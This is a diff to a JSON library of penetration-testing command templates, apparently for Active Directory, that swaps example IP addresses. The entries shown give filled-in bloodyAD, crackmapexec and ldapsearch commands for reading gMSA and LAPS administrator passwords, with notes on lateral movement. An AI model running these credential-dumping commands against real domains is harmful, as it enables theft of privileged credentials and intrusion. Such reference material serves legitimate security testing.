@@ -91,7 +91,7 @@
         {
           "name": "<DC_IP>",
           "description": "Domain controller IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         },
         {
@@ -134,7 +134,7 @@
         "Access denied": "User cannot read gMSA password"
       },
       "notes": "Alternative to gMSADumper using BloodyAD.\n\nREQUIRES:\n- Principal must be in msDS-GroupMSAMembership of the gMSA\n\nFIND gMSA ACCOUNTS:\nbloodyAD get writable --otype msDS-GroupManagedServiceAccount",
-      "filled_example": "bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '192.168.50.70' get object 'svc_gmsa$' --attr msDS-ManagedPassword"
+      "filled_example": "bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '10.10.10.70' get object 'svc_gmsa$' --attr msDS-ManagedPassword"
     },
     {
       "id": "laps-password-cme",
@@ -147,7 +147,7 @@
         {
           "name": "<TARGET>",
           "description": "Target computer or range",
-          "example": "192.168.50.0/24",
+          "example": "10.10.10.0/24",
           "required": true
         },
         {
@@ -199,7 +199,7 @@
         "Access denied": "User cannot read ms-MCS-AdmPwd attribute"
       },
       "notes": "LAPS (LOCAL ADMINISTRATOR PASSWORD SOLUTION):\nStores local admin password in AD attribute ms-MCS-AdmPwd.\n\nWHO CAN READ:\nBy default: Domain Admins, delegated groups\nBloodHound: ReadLAPSPassword edge\n\nUSE CASES:\n- Read password for local admin on workstations\n- Lateral movement without domain creds\n\nLAPS v2 (Windows LAPS):\nNew attribute: msLAPS-Password\nSupports password encryption\nUse --laps-password to auto-auth with retrieved password",
-      "filled_example": "crackmapexec smb 192.168.50.0/24 -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' --laps"
+      "filled_example": "crackmapexec smb 10.10.10.0/24 -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' --laps"
     },
     {
       "id": "laps-password-ldapsearch",
@@ -212,7 +212,7 @@
         {
           "name": "<DC_IP>",
           "description": "Domain controller IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         },
         {
@@ -284,7 +284,7 @@
         "Invalid credentials": "Check username format and password"
       },
       "notes": "MANUAL LAPS READ:\nUseful when CrackMapExec not available.\n\nFOR LAPS v2 (Windows LAPS):\nUse attribute: msLAPS-Password\n\nLIST ALL LAPS PASSWORDS:\nldapsearch -x -H ldap://<DC_IP> -D 'user@domain' -w 'pass' -b 'dc=corp,dc=local' '(ms-MCS-AdmPwd=*)' name ms-MCS-AdmPwd",
-      "filled_example": "ldapsearch -x -H ldap://192.168.50.70 -D 'user@corp.local' -w 'P@ssw0rd123!' -b 'dc=corp,dc=local' '(name=WS01)' ms-MCS-AdmPwd"
+      "filled_example": "ldapsearch -x -H ldap://10.10.10.70 -D 'user@corp.local' -w 'P@ssw0rd123!' -b 'dc=corp,dc=local' '(name=WS01)' ms-MCS-AdmPwd"
     },
     {
       "id": "powerview-gmsa",
